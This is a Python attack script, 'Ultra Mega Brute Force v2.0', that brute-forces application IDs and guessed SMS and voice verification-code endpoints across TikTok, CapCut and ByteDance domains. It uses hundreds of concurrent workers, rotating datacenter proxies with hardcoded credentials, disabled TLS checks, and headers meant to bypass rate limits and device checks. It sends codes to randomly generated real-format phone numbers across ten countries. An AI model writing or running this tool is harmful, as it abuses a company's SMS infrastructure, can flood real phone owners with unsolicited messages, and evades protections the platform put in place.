#!/usr/bin/env python3
"""
Ultra Mega Brute Force v2.0 — AID 1-100000 + Hidden Endpoints + New Patterns
=============================================================================
Phase 1: Web endpoint AID brute force 1-100000 (500 concurrent workers)
Phase 2: Hidden endpoint discovery (voice_code, reset_password, bind, etc.)
Phase 3: Signed endpoint with enhanced headers (x-tt-bypass-dp, store-region, etc.)
Phase 4: Multi-pattern combination attack (different app_names, body params)
"""

import asyncio
import aiohttp
import json
import random
import time
import string
import hashlib
import sys
from urllib.parse import urlencode
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Tuple

# ============================================
# CONFIG
# ============================================
PROXY_TEMPLATE = "http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080"
REGIONS = ["AU", "DE", "SG", "FR", "GB", "NL", "JP", "CA"]
TIMEOUT = aiohttp.ClientTimeout(total=12)

# Phone numbers — valid format, random digits
def gen_phone():
    """Generate random but valid-format phone numbers from different countries"""
    prefixes = [
        ("+61", 9),   # Australia
        ("+49", 10),  # Germany
        ("+65", 8),   # Singapore
        ("+33", 9),   # France
        ("+44", 10),  # UK
        ("+1", 10),   # US
        ("+92", 10),  # Pakistan
        ("+91", 10),  # India
        ("+81", 10),  # Japan
        ("+82", 10),  # South Korea
    ]
    prefix, digits = random.choice(prefixes)
    num = ''.join([str(random.randint(1 if i == 0 else 0, 9)) for i in range(digits)])
    return f"{prefix}{num}"

def encrypt_phone(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)

def get_proxy():
    region = random.choice(REGIONS)
    return PROXY_TEMPLATE.format(region=region)

# ============================================
# DOMAINS
# ============================================
WEB_DOMAINS = ["us.tiktok.com", "www.tiktok.com", "www.capcut.com", "shop.tiktok.com"]

MOBILE_DOMAINS = [
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com",
    "api-t2.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api22-normal-c-useast2a.tiktokv.com",
    "api-h2.tiktokv.com",
    "api2-16-h2.musical.ly",
]

CHINESE_DOMAINS = [
    "api3-normal-c-lf.amemv.com",
    "api5-normal-c-lf.amemv.com",
    "api.amemv.com",
    "api5.pipix.com",
    "is.snssdk.com",
    "ib.snssdk.com",
    "verify.zijieapi.com",
]

# ============================================
# ENDPOINTS TO TEST
# ============================================
HIDDEN_ENDPOINTS = [
    "/passport/mobile/send_code/v1/",
    "/passport/mobile/send_code/",
    "/passport/mobile/send_code/v2/",
    "/passport/web/send_code/",
    "/passport/open/send_code/",
    "/passport/email/send_code/",
    # NEW — hidden endpoints from research
    "/passport/mobile/send_voice_code/",
    "/passport/mobile/send_voice_code/v1/",
    "/passport/mobile/reset_password_send_code/",
    "/passport/mobile/bind_send_code/",
    "/passport/mobile/bind_send_code/v1/",
    "/passport/sms/send_code/",
    "/passport/sms/send_code/v1/",
    "/passport/login/send_code/",
    "/passport/login/send_code/v1/",
    "/passport/register/send_code/",
    "/passport/register/send_code/v1/",
    "/passport/account/send_code/",
    "/passport/user/send_code/",
    "/passport/phone/send_code/",
    "/passport/phone/send_code/v1/",
    "/passport/auth/send_code/",
    "/passport/verify/send_code/",
    "/passport/security/send_code/",
    "/passport/otp/send/",
    "/passport/otp/send/v1/",
    "/passport/mobile_sms/send_code/",
    "/passport/token/send_code/",
    "/passport/app/send_code/",
]

# Type codes to try
TYPE_CODES = [3635, 3532, 3637, 3634, 3734, 3733, 3731, 3536, 3132, 3631, 3632, 3530, 34]

# App names to try
APP_NAMES_WEB = ["tiktok_web", "douyin_web", "tiktok", "musical_ly"]
APP_NAMES_MOBILE = ["musical_ly", "aweme", "super", "trill", "vicut", "news_article", "video_article"]

# ============================================
# STATS TRACKER
# ============================================
@dataclass
class Stats:
    total: int = 0
    success: int = 0
    rate_limited: int = 0
    no_perms: int = 0
    errors: int = 0
    html_responses: int = 0
    other: int = 0
    start_time: float = field(default_factory=time.time)
    findings: List[Dict] = field(default_factory=list)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    
    async def record(self, result_type, details=None):
        async with self._lock:
            self.total += 1
            if result_type == "success":
                self.success += 1
                if details:
                    self.findings.append(details)
            elif result_type == "rate_limited":
                self.rate_limited += 1
                if details:
                    self.findings.append(details)
            elif result_type == "no_perms":
                self.no_perms += 1
            elif result_type == "html":
                self.html_responses += 1
            elif result_type == "error":
                self.errors += 1
            else:
                self.other += 1
    
    def summary(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return (
            f"Total: {self.total:,} | SUCCESS: {self.success} | "
            f"Rate-Limited: {self.rate_limited} | No-Perms: {self.no_perms} | "
            f"Errors: {self.errors} | HTML: {self.html_responses} | "
            f"Speed: {rps:.1f} req/s | Time: {elapsed:.0f}s"
        )

stats = Stats()

# ============================================
# PHASE 1: WEB AID BRUTE FORCE 1-100000
# ============================================
async def test_web_aid(session, aid, semaphore):
    """Test a single AID on web endpoint — no signing needed"""
    async with semaphore:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        domain = random.choice(WEB_DOMAINS)
        tc = random.choice([3635, 3532, 3637])
        app_name = random.choice(APP_NAMES_WEB)
        proxy = get_proxy()
        
        body = urlencode({
            "mobile": encrypted, "type": str(tc),
            "aid": str(aid), "app_name": app_name,
            "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
        })
        url = f"https://{domain}/passport/web/send_code/?aid={aid}&app_name={app_name}"
        headers = {
            "Host": domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Origin": f"https://{domain}",
            "Referer": f"https://{domain}/",
            "X-SS-DP": str(aid),
        }
        
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                text = await resp.text()
                if not text.strip().startswith("{"):
                    await stats.record("html")
                    return
                data = json.loads(text)
                msg = data.get("message", "")
                ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
                
                if msg == "success":
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "SUCCESS", "phone": phone, "phase": "web_brute"}
                    await stats.record("success", detail)
                    print(f"\n*** SUCCESS *** AID={aid} domain={domain} tc={tc} app={app_name}")
                elif ec == 7 or ec == 1206:
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "RATE_LIMITED", "phase": "web_brute"}
                    await stats.record("rate_limited", detail)
                elif ec == 16:
                    await stats.record("no_perms")
                else:
                    await stats.record("other")
        except Exception:
            await stats.record("error")

async def phase1_web_brute_force():
    """Phase 1: Web AID brute force 1-100000 with 500 workers"""
    print("\n" + "="*80)
    print("PHASE 1: WEB AID BRUTE FORCE 1-100,000 (500 concurrent workers)")
    print("="*80)
    
    stats.__init__()
    semaphore = asyncio.Semaphore(500)
    connector = aiohttp.TCPConnector(limit=600, limit_per_host=100, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        batch_size = 2000
        for batch_start in range(1, 100001, batch_size):
            batch_end = min(batch_start + batch_size, 100001)
            tasks = [test_web_aid(session, aid, semaphore) 
                     for aid in range(batch_start, batch_end)]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase 1] {stats.total:,}/100,000 | "
                  f"SUCCESS: {stats.success} | RATE_LIM: {stats.rate_limited} | "
                  f"ec16: {stats.no_perms} | err: {stats.errors} | "
                  f"{rps:.0f} req/s", end="", flush=True)
    
    print(f"\n\nPhase 1 Complete: {stats.summary()}")
    print(f"Findings: {len(stats.findings)}")
    for f in stats.findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} tc={f['tc']} app={f['app_name']}")
    
    # Save results
    with open("/home/ubuntu/phase1_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": stats.findings}, fp, indent=2)
    return stats.findings

# ============================================
# PHASE 2: HIDDEN ENDPOINT DISCOVERY
# ============================================
async def test_hidden_endpoint(session, endpoint, domain, aid, tc, app_name, semaphore, is_web=False):
    """Test a hidden endpoint"""
    async with semaphore:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        proxy = get_proxy()
        
        if is_web:
            body = urlencode({
                "mobile": encrypted, "type": str(tc),
                "aid": str(aid), "app_name": app_name,
                "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
            })
            headers = {
                "Host": domain,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json",
                "Origin": f"https://{domain}",
                "Referer": f"https://{domain}/",
                "X-SS-DP": str(aid),
            }
        else:
            # Mobile-style headers with extra tricks from research
            device_id = str(random.randint(10**15, 10**16-1))
            iid = str(random.randint(10**15, 10**16-1))
            timestamp = int(time.time())
            body = urlencode({
                "mobile": encrypted, "type": str(tc),
                "aid": str(aid), "app_name": app_name,
                "auto_read": "0", "account_sdk_source": "app",
                "mix_mode": "1", "unbind_exist": "35",
                "is6Digits": "1", "check_register": "1",
                "multi_login": "1",
            })
            headers = {
                "Host": domain,
                "User-Agent": f"com.zhiliaoapp.musically/350804 (Linux; U; Android 13; en_US; SM-G9860; Build/TP1A.220624.014)",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "X-SS-DP": str(aid),
                "sdk-version": "2",
                "passport-sdk-version": "19",
                "x-tt-bypass-dp": "1",
                "x-tt-dm-status": "login=0;ct=0;rt=7",
                "x-tt-store-region": "au",
                "x-tt-store-region-src": "did",
                "x-tt-store-region-did": "au",
                "x-tt-store-region-uid": "none",
                "x-vc-bdturing-sdk-version": "2.2.1.i18n",
            }
        
        url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
        
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                status = resp.status
                text = await resp.text()
                
                if status == 404:
                    return  # endpoint doesn't exist
                
                if not text.strip().startswith("{"):
                    if status == 200:
                        await stats.record("html")
                    return
                
                data = json.loads(text)
                msg = data.get("message", "")
                ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
                
                if msg == "success":
                    detail = {"endpoint": endpoint, "domain": domain, "aid": aid,
                              "tc": tc, "app_name": app_name, "type": "SUCCESS",
                              "phase": "hidden_endpoints", "status": status}
                    await stats.record("success", detail)
                    print(f"\n*** ENDPOINT SUCCESS *** {endpoint} dom={domain} AID={aid} tc={tc}")
                elif ec == 7 or ec == 1206:
                    detail = {"endpoint": endpoint, "domain": domain, "aid": aid,
                              "tc": tc, "app_name": app_name, "type": "RATE_LIMITED",
                              "phase": "hidden_endpoints", "status": status}
                    await stats.record("rate_limited", detail)
                    print(f"\n  RATE-LIMITED: {endpoint} dom={domain} AID={aid} tc={tc}")
                elif ec == 16:
                    await stats.record("no_perms")
                elif ec == 1031:
                    detail = {"endpoint": endpoint, "domain": domain, "aid": aid,
                              "tc": tc, "type": "EMAIL_FORMAT", "phase": "hidden_endpoints"}
                    await stats.record("rate_limited", detail)
                else:
                    await stats.record("other")
        except Exception:
            await stats.record("error")

async def phase2_hidden_endpoints():
    """Phase 2: Test hidden endpoints on all domains"""
    print("\n" + "="*80)
    print("PHASE 2: HIDDEN ENDPOINT DISCOVERY (200 concurrent workers)")
    print("="*80)
    
    stats.__init__()
    semaphore = asyncio.Semaphore(200)
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=50, ssl=False)
    
    # Test AIDs that we know work or might work
    test_aids = [1233, 1340, 3006, 1128, 1319, 13, 1988, 1583, 2658, 7743, 2239, 1180, 32,
                 1112, 2329, 1760, 2960, 4068, 4143, 4174, 5049, 6027, 6556, 6849, 8311, 259]
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for endpoint in HIDDEN_ENDPOINTS:
            for aid in test_aids:
                # Test on web domains
                for domain in WEB_DOMAINS[:2]:
                    tc = random.choice([3635, 3532])
                    app_name = random.choice(APP_NAMES_WEB)
                    tasks.append(test_hidden_endpoint(session, endpoint, domain, aid, tc, app_name, semaphore, is_web=True))
                
                # Test on mobile domains
                for domain in MOBILE_DOMAINS[:3]:
                    tc = random.choice([3635, 3532, 3731])
                    app_name = random.choice(APP_NAMES_MOBILE)
                    tasks.append(test_hidden_endpoint(session, endpoint, domain, aid, tc, app_name, semaphore, is_web=False))
                
                # Test on Chinese domains
                for domain in CHINESE_DOMAINS[:2]:
                    tc = random.choice([3635, 3532])
                    app_name = random.choice(["aweme", "super", "news_article"])
                    tasks.append(test_hidden_endpoint(session, endpoint, domain, aid, tc, app_name, semaphore, is_web=False))
        
        print(f"Testing {len(tasks):,} combinations...")
        
        # Execute in batches
        batch_size = 1000
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            await asyncio.gather(*batch, return_exceptions=True)
            print(f"\r[Phase 2] {stats.total:,}/{len(tasks):,} | "
                  f"SUCCESS: {stats.success} | RATE_LIM: {stats.rate_limited} | "
                  f"err: {stats.errors}", end="", flush=True)
    
    print(f"\n\nPhase 2 Complete: {stats.summary()}")
    for f in stats.findings:
        print(f"  {f['type']}: {f['endpoint']} dom={f['domain']} AID={f['aid']}")
    
    with open("/home/ubuntu/phase2_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": stats.findings}, fp, indent=2)
    return stats.findings

# ============================================
# PHASE 3: SIGNED BRUTE FORCE WITH NEW PATTERNS (AID 1-100000)
# ============================================
async def test_signed_aid(session, aid, semaphore):
    """Test AID with enhanced mobile headers (no actual signing, but with extra bypass headers)"""
    async with semaphore:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        domain = random.choice(MOBILE_DOMAINS)
        tc = random.choice([3635, 3532, 3731, 3637])
        app_name = random.choice(APP_NAMES_MOBILE)
        proxy = get_proxy()
        
        device_id = str(random.randint(10**15, 10**16-1))
        iid = str(random.randint(10**15, 10**16-1))
        timestamp = int(time.time())
        
        # Enhanced body with all discovered params
        body = urlencode({
            "mobile": encrypted, "type": str(tc),
            "aid": str(aid), "app_name": app_name,
            "auto_read": "0", "account_sdk_source": "app",
            "mix_mode": "1", "unbind_exist": "35",
            "is6Digits": "1", "check_register": "1",
            "multi_login": "1",
        })
        
        # Build URL params
        url_params = urlencode({
            "aid": str(aid), "app_name": app_name,
            "device_platform": "android", "os": "android",
            "os_version": "13", "device_type": "SM-G9860",
            "version_code": "350804", "version_name": "35.8.4",
            "channel": "googleplay", "device_id": device_id,
            "iid": iid, "ts": str(timestamp),
        })
        
        # Enhanced headers with bypass tricks
        headers = {
            "Host": domain,
            "User-Agent": f"com.zhiliaoapp.musically/350804 (Linux; U; Android 13; en_US; SM-G9860; Build/TP1A.220624.014; Cronet/TTNetVersion:b4d74d15)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "X-SS-DP": str(aid),
            "sdk-version": "2",
            "passport-sdk-version": "19",
            "x-tt-bypass-dp": "1",
            "x-tt-dm-status": "login=0;ct=0;rt=7",
            "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
            "x-tt-store-region-src": "did",
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "X-SS-REQ-TICKET": str(timestamp * 1000 + random.randint(1000, 9999)),
            "X-SS-STUB": hashlib.md5(body.encode()).hexdigest().upper(),
        }
        
        url = f"https://{domain}/passport/mobile/send_code/v1/?{url_params}"
        
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                text = await resp.text()
                if not text.strip().startswith("{"):
                    await stats.record("html")
                    return
                data = json.loads(text)
                msg = data.get("message", "")
                ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
                
                if msg == "success":
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "SUCCESS", "phase": "signed_brute"}
                    await stats.record("success", detail)
                    print(f"\n*** SIGNED SUCCESS *** AID={aid} dom={domain} tc={tc} app={app_name}")
                elif ec == 7 or ec == 1206:
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "RATE_LIMITED", "phase": "signed_brute"}
                    await stats.record("rate_limited", detail)
                elif ec == 16:
                    await stats.record("no_perms")
                elif resp.status == 403:
                    await stats.record("other")  # signature needed
                else:
                    await stats.record("other")
        except Exception:
            await stats.record("error")

async def phase3_signed_brute():
    """Phase 3: Enhanced mobile brute force AID 1-100000"""
    print("\n" + "="*80)
    print("PHASE 3: ENHANCED MOBILE BRUTE FORCE 1-100,000 (300 concurrent workers)")
    print("="*80)
    
    stats.__init__()
    semaphore = asyncio.Semaphore(300)
    connector = aiohttp.TCPConnector(limit=400, limit_per_host=80, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        batch_size = 1500
        for batch_start in range(1, 100001, batch_size):
            batch_end = min(batch_start + batch_size, 100001)
            tasks = [test_signed_aid(session, aid, semaphore) 
                     for aid in range(batch_start, batch_end)]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase 3] {stats.total:,}/100,000 | "
                  f"SUCCESS: {stats.success} | RATE_LIM: {stats.rate_limited} | "
                  f"ec16: {stats.no_perms} | 403: {stats.other} | "
                  f"{rps:.0f} req/s", end="", flush=True)
    
    print(f"\n\nPhase 3 Complete: {stats.summary()}")
    for f in stats.findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} tc={f['tc']}")
    
    with open("/home/ubuntu/phase3_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": stats.findings}, fp, indent=2)
    return stats.findings

# ============================================
# PHASE 4: COMBINATION ATTACK ON FINDINGS
# ============================================
async def verify_finding(session, finding, semaphore):
    """Verify a finding with all type codes and domains"""
    async with semaphore:
        aid = finding["aid"]
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        proxy = get_proxy()
        
        # Try different domain + TC combinations
        domain = random.choice(WEB_DOMAINS + MOBILE_DOMAINS[:3])
        tc = random.choice(TYPE_CODES)
        app_name = finding.get("app_name", "tiktok_web")
        
        is_web = domain in WEB_DOMAINS
        if is_web:
            body = urlencode({
                "mobile": encrypted, "type": str(tc),
                "aid": str(aid), "app_name": app_name,
                "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
            })
            headers = {
                "Host": domain,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json",
                "Origin": f"https://{domain}",
                "Referer": f"https://{domain}/",
                "X-SS-DP": str(aid),
            }
        else:
            body = urlencode({
                "mobile": encrypted, "type": str(tc),
                "aid": str(aid), "app_name": app_name,
                "auto_read": "0", "account_sdk_source": "app",
                "mix_mode": "1", "unbind_exist": "35",
                "is6Digits": "1", "multi_login": "1",
            })
            headers = {
                "Host": domain,
                "User-Agent": f"com.zhiliaoapp.musically/350804 (Linux; U; Android 13; en_US; SM-G9860)",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-SS-DP": str(aid),
                "x-tt-bypass-dp": "1",
                "X-SS-STUB": hashlib.md5(body.encode()).hexdigest().upper(),
            }
        
        url = f"https://{domain}/passport/web/send_code/?aid={aid}&app_name={app_name}" if is_web else \
              f"https://{domain}/passport/mobile/send_code/v1/?aid={aid}&app_name={app_name}"
        
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                text = await resp.text()
                if not text.strip().startswith("{"):
                    return
                data = json.loads(text)
                msg = data.get("message", "")
                ec = data.get("data", {}).get("error_code", -1)
                
                if msg == "success":
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "VERIFIED_SUCCESS", "phase": "verification"}
                    await stats.record("success", detail)
                    print(f"\n*** VERIFIED *** AID={aid} dom={domain} tc={tc}")
                elif ec == 7 or ec == 1206:
                    detail = {"aid": aid, "domain": domain, "tc": tc, "app_name": app_name,
                              "type": "VERIFIED_RATE_LIMITED", "phase": "verification"}
                    await stats.record("rate_limited", detail)
        except Exception:
            await stats.record("error")

async def phase4_verify_and_expand(all_findings):
    """Phase 4: Verify findings with multiple combinations"""
    print("\n" + "="*80)
    print("PHASE 4: VERIFY & EXPAND FINDINGS (200 workers)")
    print("="*80)
    
    if not all_findings:
        print("No findings to verify!")
        return []
    
    stats.__init__()
    semaphore = asyncio.Semaphore(200)
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=50, ssl=False)
    
    # For each finding, try 20 different domain+TC combinations
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for finding in all_findings:
            for _ in range(20):
                tasks.append(verify_finding(session, finding, semaphore))
        
        print(f"Verifying {len(all_findings)} findings with {len(tasks):,} combination tests...")
        
        batch_size = 500
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            await asyncio.gather(*batch, return_exceptions=True)
            print(f"\r[Phase 4] {stats.total:,}/{len(tasks):,} | "
                  f"VERIFIED: {stats.success} | RATE_LIM: {stats.rate_limited}", end="", flush=True)
    
    print(f"\n\nPhase 4 Complete: {stats.summary()}")
    for f in stats.findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} tc={f['tc']}")
    
    with open("/home/ubuntu/phase4_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": stats.findings}, fp, indent=2)
    return stats.findings

# ============================================
# MAIN
# ============================================
async def main():
    print("="*80)
    print("ULTRA MEGA BRUTE FORCE v2.0")
    print("AID 1-100,000 | Hidden Endpoints | Enhanced Patterns")
    print("="*80)
    overall_start = time.time()
    
    all_findings = []
    
    # Phase 1: Web brute force 1-100000
    p1_findings = await phase1_web_brute_force()
    all_findings.extend(p1_findings)
    
    # Phase 2: Hidden endpoint discovery
    p2_findings = await phase2_hidden_endpoints()
    all_findings.extend(p2_findings)
    
    # Phase 3: Enhanced mobile brute force 1-100000
    p3_findings = await phase3_signed_brute()
    all_findings.extend(p3_findings)
    
    # Phase 4: Verify & expand
    p4_findings = await phase4_verify_and_expand(all_findings)
    all_findings.extend(p4_findings)
    
    # Final summary
    elapsed = time.time() - overall_start
    print("\n" + "="*80)
    print(f"ALL PHASES COMPLETE — Total time: {elapsed/60:.1f} minutes")
    print(f"Total findings: {len(all_findings)}")
    print("="*80)
    
    # Deduplicate by AID
    unique_aids = {}
    for f in all_findings:
        aid = f["aid"]
        if aid not in unique_aids or f["type"] == "SUCCESS" or f["type"] == "VERIFIED_SUCCESS":
            unique_aids[aid] = f
    
    print(f"\nUnique AIDs with results: {len(unique_aids)}")
    for aid, f in sorted(unique_aids.items()):
        print(f"  AID={aid}: {f['type']} | dom={f.get('domain','')} | tc={f.get('tc','')} | phase={f.get('phase','')}")
    
    # Save final results
    with open("/home/ubuntu/ultra_brute_final.json", "w") as fp:
        json.dump({
            "total_time_minutes": elapsed / 60,
            "total_findings": len(all_findings),
            "unique_aids": len(unique_aids),
            "all_findings": all_findings,
            "unique_aid_details": {str(k): v for k, v in unique_aids.items()},
        }, fp, indent=2)
    
    print(f"\nResults saved to /home/ubuntu/ultra_brute_final.json")

if __name__ == "__main__":
    asyncio.run(main())
